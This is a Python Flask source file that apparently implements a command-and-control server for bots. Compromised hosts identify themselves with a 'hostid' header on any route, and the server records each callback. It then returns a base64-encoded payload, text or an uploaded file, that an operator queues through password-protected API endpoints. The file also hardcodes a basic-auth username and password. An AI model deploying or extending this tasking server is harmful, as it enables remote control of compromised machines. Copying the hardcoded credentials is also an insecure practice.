from datetime import datetime
from flask import Flask, request, flash, url_for, redirect, \
     render_template, abort, Response, jsonify
from sqlalchemy.ext.hybrid import hybrid_property
from flask_sqlalchemy import SQLAlchemy
from base64 import b64encode as b64e, b64decode as b64d
from datetime import datetime
from functools import wraps


app = Flask(__name__)
app.config.from_pyfile('serv.cfg')
db = SQLAlchemy(app)

def check_auth(username, password):
    """This function is called to check if a username /
    password combination is valid.
    """
    return username == 'jimmy' and password == 'natsys1!'

def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
    'Could not verify your access level for that URL.\n'
    'You have to login with proper credentials', 401,
    {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

class HostBot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(100))
    resp = db.Column(db.String)
    last_cb = db.Column(db.DateTime)
    cb_host = db.Column(db.String)

    @hybrid_property
    def resp_b64(self):
        return b64e(self.resp)

    @hybrid_property
    def serialize(self):
        return [
                   str(self.id),
                   self.hostname,
                   self.cb_host,
                   self.last_cb.strftime('%m/%d/%Y %I:%M:%S %p'),
                   self.resp
               ]

@app.route('/<route>')
def cb(route):
    hostname = request.headers.get("hostid", None)
    if not hostname:
        return abort(403)
    b = HostBot.query.filter_by(hostname=hostname, cb_host=request.host).first()
    if not b:
        b = HostBot(hostname=hostname, resp="")
    b.cb_host = request.host
    b.last_cb = datetime.now()
    db.session.add(b)
    db.session.commit()
    return b.resp_b64

@app.route('/api/delete/<int:id>', methods=["GET"])
@requires_auth
def delete(id):
    try:
        b = HostBot.query.filter_by(id=id).one()
    except:
        abort(404)
    db.session.delete(b)
    db.session.commit()
    return '', 200

@app.route('/api/update/<int:id>', methods=["POST"])
@requires_auth
def update(id):
    try:
        b = HostBot.query.filter_by(id=id).one()
    except:
        abort(404)
    f = request.files.get('filereq', None)
    t = request.form.get("textentry", None)
    if request.form.get("clear", None):
        print("Clear set")
        b.resp = ""
    elif t:
        print("Text set")
        b.resp = t
    elif f:
        print("Read file")
        b.resp = f.read()
    db.session.add(b)
    db.session.commit()
    return '', 200
    

@app.route('/api/json')
@requires_auth
def json_api():
    return jsonify({"data": [i.serialize for i in HostBot.query.all()]})
    

@app.route('/')
@requires_auth
def index():
    b = HostBot.query.all()
    return render_template("index.htm", b=b)

if __name__ == '__main__':
    db.create_all()
    db.session.commit()
    app.run(host='0.0.0.0', port=80)
